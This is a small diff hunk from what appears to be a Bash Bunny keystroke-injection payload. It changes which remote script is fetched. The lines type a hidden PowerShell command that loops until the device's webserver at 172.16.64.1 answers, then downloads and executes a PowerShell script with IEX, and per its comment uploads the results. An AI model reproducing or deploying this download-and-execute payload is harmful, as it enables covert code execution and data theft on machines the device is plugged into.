@@ -53,7 +53,7 @@ Q DELAY 1500
 
 LED STAGE2 
 #Powershell Payload: first wait for connection to bunny webserver, then pull scripts and upload results
-Q STRING "powershell -W Hidden \"while (\$true) {If (Test-Connection 172.16.64.1 -count 1) {IEX (New-Object Net.WebClient).DownloadString('http://172.16.64.1/p_v3.ps1');exit}}\""
+Q STRING "powershell -W Hidden \"while (\$true) {If (Test-Connection 172.16.64.1 -count 1) {IEX (New-Object Net.WebClient).DownloadString('http://172.16.64.1/p_v2.ps1');exit}}\""
 Q DELAY 300
 Q ENTER
 # Ethernet Attack Starts
